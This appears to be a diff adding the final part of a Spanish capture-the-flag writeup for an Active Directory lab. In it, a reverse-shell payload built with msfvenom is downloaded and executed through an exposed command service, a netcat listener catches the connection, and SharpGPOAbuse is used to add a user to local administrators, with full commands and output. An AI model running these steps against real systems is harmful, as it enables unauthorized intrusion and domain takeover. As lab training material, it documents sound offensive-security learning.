@@ -422,3 +422,149 @@ OK
 Además de password vemos un `parámetro command` donde podemos `ejecutar un binario`.
 
 ![](/assets/images/writeup-context/dnSpy5.png)
+
+Sabiendo esto `creamos un payload con msfvenom` y montamos un `servidor http`.
+
+```
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.14.10 LPORT=443 -f exe -o shell.exe
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe
+
+
+❯ sudo python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Descargamos el `.exe`, `nos conectamos` al servicio, y despues de dar la contraseña `lo invocamos`.
+
+```
+PS C:\ProgramData> curl 10.13.14.10/shell.exe -o shell.exe
+PS C:\ProgramData> .\netcat.exe 127.0.0.1 7734 -v
+netcat.exe : WEB.TEIGNTON.HTB [127.0.0.1] 7734 (?) open
+password=2022-07-30-thisisleet
+OK
+command=c:\programdata\shell.exe
+CONTEXT{l0l_s0c3ts_4re_fun}
+PS C:\ProgramData>
+```
+
+Si miramos el `listener` deberiamos haber `recibido una shell como otro usuario`:
+
+```
+❯ sudo netcat -lvnp 443
+
+Listening on 0.0.0.0 443
+Connection received on 10.13.37.12
+Microsoft Windows [Version 10.0.17763.1490]
+(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Windows\system32> powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+teignton\andy.teignton
+PS C:\Windows\system32>
+```
+
+Jungando con `bloodhound` encontramos una ruta para `escalar privilegio`.
+
+Para eso lo explotaremos de la siguiente manera con ayuda de `SharpGPOAbuse`:
+
+Iniciamos `creando un nuevo GPO` y `un GPLink`, con cualquier nombre en este caso privesc.
+
+```
+PS C:\ProgramData> New-GPO -Name privesc -Comment "Privilege Escalation"
+
+DisplayName      : privesc
+DomainName       : TEIGNTON.HTB
+Owner            : TEIGNTON\andy.teignton
+Id               : d5ea7314-db30-4c0d-89a4-9f7db3c48517
+GpoStatus        : AllSettingsEnabled
+Description      : Privilege Escalation
+CreationTime     : 30/07/2022 01:43:00
+ModificationTime : 30/07/2022 01:43:00
+UserVersion      : AD Version: 0, SysVol Version: 0
+ComputerVersion  : AD Version: 0, SysVol Version: 0
+WmiFilter        : 
+
+PS C:\ProgramData> New-GPLink -Name privesc -Target "OU=Domain Controllers,DC=TEIGNTON,DC=HTB" -LinkEnabled Yes
+
+GpoId       : d5ea7314-db30-4c0d-89a4-9f7db3c48517
+DisplayName : privesc
+Enabled     : True
+Enforced    : False
+Target      : OU=Domain Controllers,DC=TEIGNTON,DC=HTB
+Order       : 2
+
+PS C:\ProgramData>
+```
+
+Ahora con ayuda de SharpGPOAbuse `agregamos a jay.teignton a Administradores`.
+
+```
+PS C:\ProgramData> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jay.teignton --gponame privesc
+
+[+] Domain = teignton.htb
+[+] Domain Controller = WEB.TEIGNTON.HTB
+[+] Distinguished Name = CN=Policies,CN=System,DC=TEIGNTON,DC=HTB
+[+] SID Value of jay.teignton = S-1-5-21-3174020193-2022906219-3623556448-1103
+[+] GUID of "privesc" is: {D5EA7314-DB30-4C0D-89A4-9F7DB3C48517}
+[+] Creating file \\teignton.htb\SysVol\teignton.htb\Policies\{D5EA7314-DB30-4C0D-89A4-9F7DB3C48517}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+PS C:\ProgramData>
+```
+
+`Actualizamos la configuración` y al conectarnos ahora estamos en el grupo Administrators:
+
+```
+PS C:\ProgramData> gpupdate /force
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.
+
+PS C:\ProgramData>
+```
+
+```
+❯ evil-winrm -i 10.13.37.12 -u jay.teignton -p 'D0ntL0seSk3l3tonK3y!'
+PS C:\Users\jay.teignton\Documents> net user jay.teignton | Select-String Group
+
+Local Group Memberships      *Administrators       *Remote Desktop Users
+Global Group memberships     *Domain Users
+
+PS C:\Users\jay.teignton\Documents>
+```
+
+Ahora nos dirigimos al directorio Administrator y podemos leer la FLAG: `CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}`
+
+```
+PS C:\Users\jay.teignton\Documents> cd C:\Users\Administrator\Documents
+PS C:\Users\Administrator\Documents> dir
+
+    Directory: C:\Users\Administrator\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/12/2020   5:53 PM                SQL Server Management Studio
+d-----       10/12/2020   6:53 PM                Visual Studio 2017
+-a----        7/15/2020   8:15 PM             34 flag.txt
+-a----        7/29/2020  12:28 PM            188 info.txt
+
+PS C:\Users\Administrator\Documents> type flag.txt
+CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}
+PS C:\Users\Administrator\Documents>
+```
+
+![](/assets/images/writeup-context/uwu.PNG)
+
+uwu
